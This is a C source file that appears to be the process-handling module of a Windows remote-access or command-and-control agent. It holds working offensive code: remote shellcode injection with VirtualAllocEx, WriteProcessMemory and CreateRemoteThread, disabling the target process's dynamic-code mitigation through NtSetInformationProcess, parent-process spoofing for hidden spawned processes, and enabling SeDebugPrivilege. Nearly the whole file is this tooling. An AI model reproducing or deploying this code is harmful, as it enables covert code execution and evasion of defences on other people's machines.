#include <Windows.h>
#include <WinBase.h>
#include <stdint.h>
#include <processenv.h>
#include <tlhelp32.h>
#include <securitybaseapi.h>
#include <processthreadsapi.h>
#include <sysinfoapi.h>
#include <stdio.h>
#include <psapi.h>
#include <LM.h>
#include <winternl.h>
#include "cJSON.h"
#include "agent_process.h"
#include "agent_utility.h"
#include "agent_session.h"
#include "agent_protocol.h"
#include "agent_config.h"
#include "agent_commands.h"

typedef struct _PROCESS_MITIGATION_POLICY_INFORMATION {
	PROCESS_MITIGATION_POLICY Policy;
	union {
		PROCESS_MITIGATION_ASLR_POLICY ASLRPolicy;
		PROCESS_MITIGATION_STRICT_HANDLE_CHECK_POLICY StrictHandleCheckPolicy;
		PROCESS_MITIGATION_SYSTEM_CALL_DISABLE_POLICY SystemCallDisablePolicy;
		PROCESS_MITIGATION_EXTENSION_POINT_DISABLE_POLICY ExtensionPointDisablePolicy;
		PROCESS_MITIGATION_DYNAMIC_CODE_POLICY DynamicCodePolicy;
		PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY ControlFlowGuardPolicy;
		PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY SignaturePolicy;
		PROCESS_MITIGATION_FONT_DISABLE_POLICY FontDisablePolicy;
		PROCESS_MITIGATION_IMAGE_LOAD_POLICY ImageLoadPolicy;
		PROCESS_MITIGATION_SYSTEM_CALL_FILTER_POLICY SystemCallFilterPolicy;
		PROCESS_MITIGATION_PAYLOAD_RESTRICTION_POLICY PayloadRestrictionPolicy;
		PROCESS_MITIGATION_CHILD_PROCESS_POLICY ChildProcessPolicy;
		PROCESS_MITIGATION_SIDE_CHANNEL_ISOLATION_POLICY SideChannelIsolationPolicy;
	};
} PROCESS_MITIGATION_POLICY_INFORMATION, * PPROCESS_MITIGATION_POLICY_INFORMATION; /* size: 0x0008 */

typedef NTSTATUS(NTAPI* type_NtSetInformationProcess)(
	IN HANDLE ProcessHandle,
	IN PROCESS_INFORMATION_CLASS ProcessInformationClass,
	IN PVOID ProcessInformation,
	IN ULONG ProcessInformationLength
	);

bool adjust_token_privileges(void) {
	bool result = false;
	HANDLE hToken = 0;
	TOKEN_PRIVILEGES sTP = { 0 };

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {		
		if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sTP.Privileges[0].Luid)) {
			sTP.PrivilegeCount = 1;
			sTP.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			result = AdjustTokenPrivileges(hToken, 0, &sTP, sizeof(sTP), NULL, NULL);
		}
		CloseHandle(hToken);
	}
	return result;
}

char* get_process_list(void) {
	HANDLE snapshot = 0;
	HANDLE hProcess = 0;
	HANDLE hProcessToken = 0;
	size_t size = 0;
	int32_t process_session = -1;
	char* account_name = ZERO(char);
	const char* eleveted_type = "";
	PTOKEN_USER pToken = ZERO(TOKEN_USER);
	PTOKEN_MANDATORY_LABEL pTml = ZERO(TOKEN_MANDATORY_LABEL);
	PTOKEN_ELEVATION_TYPE pElevation = ZERO(TOKEN_ELEVATION_TYPE);
	cJSON* jprocess_list = ZERO(cJSON);
	cJSON* jprocess_info = ZERO(cJSON);
	cJSON* jname = ZERO(cJSON);
	cJSON* jpid = ZERO(cJSON);
	cJSON* jintegrity_level = ZERO(cJSON);
	cJSON* jsession_level = ZERO(cJSON);
	cJSON* jarch = ZERO(cJSON);
	cJSON* jaccount = ZERO(cJSON);
	cJSON* jelevated = ZERO(cJSON);

	PROCESSENTRY32 pe32 = { 0 };
	jprocess_list = cJSON_CreateArray();
	if (!jprocess_list) goto fail;

	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == INVALID_HANDLE_VALUE) goto fail;

	pe32.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(snapshot, &pe32)) goto fail;

	SYSTEM_INFO sys_info = { 0 };
	GetNativeSystemInfo(&sys_info);
	bool im_64_bit = sys_info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64;

	do
	{
		const char* integrity_level = "";
		const char* architecture = "";

		// get process session
		ProcessIdToSessionId(pe32.th32ProcessID, &process_session);

		hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
		if (!hProcess) goto next;

		// get process architecture
		// alternative method: https://github.com/rapid7/meterpreter/blob/d338f702ce8cb7f4e550f005ececaf5f3cadd2bc/source/extensions/stdapi/server/sys/process/ps.c#L12				
		if (im_64_bit) {
			bool is_process_32 = false;
			if (!IsWow64Process(hProcess, &is_process_32)) goto next;
			architecture = (is_process_32) ? "x86" : "x64";
		}
		else
			architecture = "x86";

		if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hProcessToken)) goto next;

		// get process token type
		GetTokenInformation(hProcessToken, TokenElevationType, NULL, 0, &size);
		if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) goto fail;
		pElevation = MEM_ALLOC(size);
		if (!pElevation) goto fail;
		if (!GetTokenInformation(hProcessToken, TokenElevationType, pElevation, size, &size)) goto fail;

		if (*pElevation == TokenElevationTypeDefault) eleveted_type = "default";
		else if (*pElevation == TokenElevationTypeFull) eleveted_type = "elevated";
		else if (*pElevation == TokenElevationTypeLimited) eleveted_type = "limited";

		// get process account name				
		GetTokenInformation(hProcessToken, TokenUser, NULL, 0, &size);
		if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) goto next;
		pToken = MEM_ALLOC(size);
		if (!pToken) goto fail;
		if (!GetTokenInformation(hProcessToken, TokenUser, pToken, size, &size)) goto next;

		SID_NAME_USE snuSIDNameUse;
		char szUser[MAX_PATH] = { 0 };
		size_t dwUserNameLength = MAX_PATH;
		char szDomain[MAX_PATH] = { 0 };
		size_t dwDomainNameLength = MAX_PATH;
		if (!LookupAccountSid(
			0,
			pToken->User.Sid,
			szUser,
			&dwUserNameLength,
			szDomain,
			&dwDomainNameLength,
			&snuSIDNameUse
		)) goto next;

		size = snprintf(0, 0, "%s/%s", szDomain, szUser) + 1;
		account_name = MEM_ALLOC(size);
		if (!account_name) goto fail;
		snprintf(account_name, size, "%s/%s", szDomain, szUser);

		// get integrity level		
		GetTokenInformation(hProcessToken, TokenIntegrityLevel, NULL, 0, &size);
		if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) goto next;
		pTml = MEM_ALLOC(size);
		if (!pTml) goto fail;
		if (!GetTokenInformation(hProcessToken, TokenIntegrityLevel, pTml, size, &size)) goto next;
		uint32_t ridIl = *GetSidSubAuthority(pTml->Label.Sid, 0);

		if (ridIl < SECURITY_MANDATORY_LOW_RID) integrity_level = "Untrusted";
		else if (ridIl >= SECURITY_MANDATORY_LOW_RID && ridIl < SECURITY_MANDATORY_MEDIUM_RID) integrity_level = "Low";
		else if (ridIl >= SECURITY_MANDATORY_MEDIUM_RID && ridIl < SECURITY_MANDATORY_MEDIUM_PLUS_RID) integrity_level = "Medium";
		else if (ridIl >= SECURITY_MANDATORY_MEDIUM_PLUS_RID && ridIl < SECURITY_MANDATORY_HIGH_RID) integrity_level = "Medium+";
		else if (ridIl >= SECURITY_MANDATORY_HIGH_RID && ridIl < SECURITY_MANDATORY_SYSTEM_RID) integrity_level = "High";
		else if (ridIl >= SECURITY_MANDATORY_SYSTEM_RID && ridIl < SECURITY_MANDATORY_PROTECTED_PROCESS_RID) integrity_level = "System";
		else if (ridIl >= SECURITY_MANDATORY_PROTECTED_PROCESS_RID) integrity_level = "Protected";

	next:
		jprocess_info = cJSON_CreateObject();
		if (!jprocess_info) goto fail;

		jname = cJSON_CreateString(pe32.szExeFile ? pe32.szExeFile : "");
		if (!jname) goto fail;
		if (!cJSON_AddItemToObject(jprocess_info, "name", jname)) goto fail;

		jpid = cJSON_CreateNumber(pe32.th32ProcessID);
		if (!jpid) goto fail;
		if (!cJSON_AddItemToObject(jprocess_info, "pid", jpid)) goto fail;

		jsession_level = cJSON_CreateNumber(process_session);
		if (!jsession_level) goto fail;
		if (!cJSON_AddItemToObject(jprocess_info, "session", jsession_level)) goto fail;

		jintegrity_level = cJSON_CreateString(integrity_level);
		if (!jintegrity_level) goto fail;
		if (!cJSON_AddItemToObject(jprocess_info, "integrity", jintegrity_level)) goto fail;

		jelevated = cJSON_CreateString(eleveted_type);
		if (!jelevated) goto fail;
		if (!cJSON_AddItemToObject(jprocess_info, "elevated", jelevated)) goto fail;

		jarch = cJSON_CreateString(architecture);
		if (!jarch) goto fail;
		if (!cJSON_AddItemToObject(jprocess_info, "arch", jarch)) goto fail;

		jaccount = cJSON_CreateString(account_name ? account_name : "");
		if (!jaccount) goto fail;
		if (!cJSON_AddItemToObject(jprocess_info, "account", jaccount)) goto fail;

		if (!cJSON_AddItemToArray(jprocess_list, jprocess_info)) goto fail;

		if (hProcessToken) CloseHandle(hProcessToken);
		if (hProcess) CloseHandle(hProcess);
		hProcessToken = 0;
		hProcess = 0;
		FREE(account_name);
		FREE(pToken);
		FREE(pTml);
		FREE(pElevation);
		process_session = -1;
	} while (Process32Next(snapshot, &pe32));

	CloseHandle(snapshot);
	char* result = cJSON_Print(jprocess_list);
	cJSON_Delete(jprocess_list);
	return result;

fail:
	FREE(account_name);
	FREE(pToken);
	FREE(pTml);
	FREE(pElevation);
	if (jprocess_list) cJSON_Delete(jprocess_list);
	if (snapshot) CloseHandle(snapshot);
	return ZERO(char);
}

static bool disable_dynamic_code_mitigation_policy(HANDLE hProcess) {
	PROCESS_MITIGATION_DYNAMIC_CODE_POLICY policy = { 0 };
	bool result = true;

	// check if the dynamic code is enbaled
	FARPROC func_GetProcessMitigationPolicy = GetProcAddress(GetModuleHandle("Kernel32.dll"), "GetProcessMitigationPolicy");
	if (func_GetProcessMitigationPolicy) {
		if (!((BOOL(WINAPI *)(HANDLE, uint32_t, PVOID, SIZE_T))func_GetProcessMitigationPolicy)(
			hProcess, 
			ProcessDynamicCodePolicy, 
			&policy, 
			sizeof policy
		)) return false;

		if (policy.ProhibitDynamicCode) {
			// see: https://reverseengineering.stackexchange.com/questions/21840/microsoft-edge-and-its-related-processes-may-have-turned-protected-in-windows-1	
			PROCESS_MITIGATION_POLICY_INFORMATION policy_info = { 0 };
			policy_info.Policy = ProcessDynamicCodePolicy;
			policy_info.DynamicCodePolicy.ProhibitDynamicCode = false;

			type_NtSetInformationProcess NtSetInformationProcess = (type_NtSetInformationProcess)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtSetInformationProcess");

			NTSTATUS status = NtSetInformationProcess(
				hProcess,
				(PROCESS_INFORMATION_CLASS)0x34, /* ProcessMitigationPolicy */
				&policy_info,
				sizeof policy_info
			);

			result = NT_SUCCESS(status);
		}
	}
	
	return result;
}

uint32_t process_inject_shellcode(uint32_t pid, size_t buffer_size, uint8_t* buffer, thread_handle* thandle) {
	size_t num_bytes_written = 0;
	uint32_t error = ERROR_OK;
	void* base_address = ZERO(void);

	HANDLE hProcess = OpenProcess(
		PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_SET_INFORMATION |
		PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
		false,
		pid
	);
	if (!hProcess) {
		error = ERROR_INJECTION_OPENPROCESS;
		goto fail;
	}

	if (!disable_dynamic_code_mitigation_policy(hProcess)) {
		error = ERROR_INJECTION_ENABLEDYNAMICCODE;
		goto fail;
	}
	
	base_address = VirtualAllocEx(
		hProcess,
		NULL,
		buffer_size,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	if (!base_address) {
		error = ERROR_INJECTION_VIRTUALALLOC;
		goto fail;
	}

	if (!WriteProcessMemory(
		hProcess,
		base_address,
		(void*)buffer,
		buffer_size,
		&num_bytes_written
	)) {
		error = ERROR_INJECTION_WRITEPROCESSMEMORY;
		goto fail;
	}

	HANDLE hThread = CreateRemoteThread(
		hProcess,
		(LPSECURITY_ATTRIBUTES)NULL,
		0,
		(LPTHREAD_START_ROUTINE)base_address,
		NULL,
		0,
		NULL
	);

	if (!hThread) {
		error = ERROR_INJECTION_CREATEREMOTETHREAD;
		goto fail;
	}
	
	CloseHandle(hProcess);
	if (thandle) thread_set_handle(thandle, (uintptr_t)hThread);
	return error;

fail:
	if (base_address) VirtualFreeEx(hProcess, base_address, buffer_size, MEM_RELEASE);
	return error;
}

static HANDLE customize_process(char* parent_process, STARTUPINFOEX* siStartInfo, HANDLE* out_write, HANDLE* in_read) {
	DWORD processes[4096] = { 0 };
	cJSON* jProcessParent = ZERO(cJSON);
	size_t cbNeeded = 0;
	HANDLE hProcess = { 0 };

	if (!EnumProcesses(processes, sizeof(processes), &cbNeeded)) goto fail;
	for (size_t i = 0; i < cbNeeded / sizeof(DWORD); i++) {
		if (processes[i]) {
			uint32_t my_session_id = 0;
			uint32_t parent_session_id = 0;

			hProcess = OpenProcess(
				PROCESS_DUP_HANDLE | PROCESS_CREATE_PROCESS |
				PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
				false,
				processes[i]
			);

			if (hProcess) {
				HMODULE hMod = 0;
				size_t cbNeeded = 0;
				char szProcessName[MAX_PATH] = { 0 };

				if (GetProcessImageFileName(hProcess, szProcessName, sizeof(szProcessName))) {
					if (strstr(szProcessName, parent_process)) {
						if (!ProcessIdToSessionId(GetCurrentProcessId(), &my_session_id)) goto fail;
						if (!ProcessIdToSessionId(processes[i], &parent_session_id)) goto fail;
						if (parent_session_id != my_session_id) return true;

						// duplicate out write handle 
						HANDLE dup_OUT_wr = 0;
						DuplicateHandle(
							GetCurrentProcess(),
							*out_write,
							hProcess,
							&dup_OUT_wr,
							0,
							1,
							DUPLICATE_SAME_ACCESS | DUPLICATE_CLOSE_SOURCE
						);
						*out_write = dup_OUT_wr;

						// duplicate in read handle 
						HANDLE dup_IN_Rd = 0;
						DuplicateHandle(
							GetCurrentProcess(),
							*in_read,
							hProcess,
							&dup_IN_Rd,
							0,
							1,
							DUPLICATE_SAME_ACCESS | DUPLICATE_CLOSE_SOURCE
						);
						*in_read = dup_IN_Rd;

						// set attribute for process-reparenting
						LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList = { 0 };
						size_t list_size = 0;

						// allocate the needed buffer
						InitializeProcThreadAttributeList(0, 1, 0, &list_size);
						if (!list_size) goto fail;
						lpAttributeList = MEM_ALLOC(list_size);
						if (!lpAttributeList) goto fail;
						if (!InitializeProcThreadAttributeList(lpAttributeList, 1, 0, &list_size)) goto fail;

						// create thread attribute
						if (!UpdateProcThreadAttribute(
							lpAttributeList,
							0,
							PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
							&hProcess,
							sizeof(HANDLE),
							NULL,
							NULL
						)) goto fail;

						siStartInfo->lpAttributeList = lpAttributeList;
						break;
					}
				}
			}

			CloseHandle(hProcess);
			hProcess = 0;
		}
	}

	return hProcess;

fail:
	if (hProcess) CloseHandle(hProcess);
	return 0;
}

uint32_t process_run(char* program_name, char* arguments, char* parent_process, process_handle* process) {	
	// see: https://docs.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output?redirectedfrom=MSDN
	STARTUPINFOEX siStartInfo = { 0 };	
	PROCESS_INFORMATION piProcInfo = { 0 };
	SECURITY_ATTRIBUTES saAttr = { 0 };
	char* expanded_program_name = ZERO(char);
	char* expanded_args = ZERO(char);
	uint32_t creation_flags = EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW;
	BOOL bSuccess = false;	
	uint32_t error = ERROR_UNKNOWN;
	
	HANDLE hParentProcess = 0;
	HANDLE hChildStd_IN_Rd = NULL;
	HANDLE hChildStd_IN_Wr = NULL;
	HANDLE hChildStd_OUT_Rd = NULL;
	HANDLE hChildStd_OUT_Wr = NULL;
	HANDLE hInputFile = NULL;
	HANDLE hToken = NULL;
	HANDLE hNewToken = NULL;

	if (!process) goto fail;

	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = true;
	saAttr.lpSecurityDescriptor = ZERO(void);

	// create child OUT pipe
	DWORD mode = PIPE_WAIT;
	if (!CreatePipe(&hChildStd_OUT_Rd, &hChildStd_OUT_Wr, &saAttr, 0)) goto fail;	
	if (!SetNamedPipeHandleState(hChildStd_OUT_Rd, &mode, NULL, NULL)) goto fail;

	// create child IN pipe
	if (!CreatePipe(&hChildStd_IN_Rd, &hChildStd_IN_Wr, &saAttr, 0)) goto fail;
	
	// apply re-parenting if necessary
	if (parent_process) {
		hParentProcess =
			customize_process(
				parent_process,
				&siStartInfo,
				&hChildStd_OUT_Wr,
				&hChildStd_IN_Rd
			);
	}

	if (!SetHandleInformation(hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0)) goto fail;
	if (!SetHandleInformation(hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0)) goto fail;
	
	// set startup info
	siStartInfo.StartupInfo.cb = sizeof siStartInfo;
	siStartInfo.StartupInfo.hStdError = hChildStd_OUT_Wr;
	siStartInfo.StartupInfo.hStdOutput = hChildStd_OUT_Wr;
	siStartInfo.StartupInfo.hStdInput = hChildStd_IN_Rd;
	siStartInfo.StartupInfo.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	siStartInfo.StartupInfo.wShowWindow = SW_HIDE;

	// expand env variables
	uint32_t olen = 0;
	if (program_name) {
		olen = ExpandEnvironmentStrings(program_name, expanded_program_name, olen);
		expanded_program_name = MEM_ALLOC(olen);
		if (!expanded_program_name) goto fail;
		ExpandEnvironmentStrings(program_name, expanded_program_name, olen);
	}

	olen = 0;	
	if (arguments) {
		olen = ExpandEnvironmentStrings(arguments, expanded_args, olen);
		expanded_args = MEM_ALLOC(olen);
		if (!expanded_args) goto fail;
		ExpandEnvironmentStrings(arguments, expanded_args, olen);
	}
	else if (!program_name) goto fail;

	// duplicate my token to be sure that the spawned process has the same privileges
	if (!OpenProcessToken(
		GetCurrentProcess(),
		TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY,
		&hToken)) goto fail;

	if (!DuplicateTokenEx(
		hToken,
		MAXIMUM_ALLOWED,
		NULL,
		SecurityImpersonation,
		TokenPrimary,
		&hNewToken)) goto fail;

	DWORD dwUIAccess = 0;
	if (!SetTokenInformation(
		hNewToken, 
		TokenUIAccess, 
		&dwUIAccess, 
		sizeof(dwUIAccess))) goto fail;

	// create process
	bSuccess = CreateProcessAsUser(
		hNewToken,							// handle to the primary token
		expanded_program_name,				// application name
		expanded_args,						// command line 
		ZERO(void),							// process security attributes 
		ZERO(void),							// primary thread security attributes 
		true,								// handles are inherited 		
		creation_flags,						// creation flags 
		ZERO(char),							// use parent's environment 
		ZERO(char),							// use parent's current directory 
		&siStartInfo.StartupInfo,			// STARTUPINFO pointer 
		&piProcInfo);						// receives PROCESS_INFORMATION 

	CloseHandle(hToken);
	CloseHandle(hNewToken);

	// this wait is necessary to avoid a possible race-condition
	// since the loader needs time to setup the process
	sleep_ms(800);
	
	if (siStartInfo.lpAttributeList) {
		DeleteProcThreadAttributeList(siStartInfo.lpAttributeList);
		FREE(siStartInfo.lpAttributeList);
	}

	FREE(expanded_program_name);
	FREE(expanded_args);
	if (!bSuccess) {
		error = ERROR_PROCESS_CREATION;
		goto fail;
	}

	// populate process structure	
	process->proc_stdin = (uintptr_t)hChildStd_IN_Wr;
	process->proc_stdout = (uintptr_t)hChildStd_OUT_Rd;
	process->handle = (uintptr_t)piProcInfo.hProcess;
	process->pid = piProcInfo.dwProcessId;

	if (hParentProcess) CloseHandle(hParentProcess);
	error = ERROR_OK;
	return error;

fail:
	FREE(expanded_program_name);
	FREE(expanded_args);
	return error;
}

bool process_is_alive_by_pid(uint32_t pid) {
	HANDLE process = OpenProcess(SYNCHRONIZE, FALSE, pid);
	DWORD ret = WaitForSingleObject(process, 0);
	CloseHandle(process);
	return ret == WAIT_TIMEOUT;
}

bool process_is_alive(process_handle* process) {
	DWORD dwExitCode = 0;
	if (!process || !process->handle)
		return false;

	if (!GetExitCodeProcess((HANDLE)process->handle, &dwExitCode))
		return false;
	return dwExitCode == STILL_ACTIVE;
}


void process_free(process_handle* process, bool kill_process) {
	if (process && process->handle) {
		if (kill_process) {
			DWORD exitCode = 0;
			GetExitCodeProcess((HANDLE)process->handle, (LPDWORD)&exitCode);
			if (exitCode == STILL_ACTIVE) {
				TerminateProcess((HANDLE)process->handle, 0);
			}
		}		
		CloseHandle((HANDLE)process->handle);
		process->handle = 0;
	}	
	FREE(process);
}

bool process_kill(uint32_t pid) {
	HANDLE process = OpenProcess(PROCESS_TERMINATE, FALSE, pid);	
	bool result = TerminateProcess(process, 0);
	CloseHandle(process);
	return result;
}

uint32_t get_pid(void)
{
	return (uint32_t)GetCurrentProcessId();
}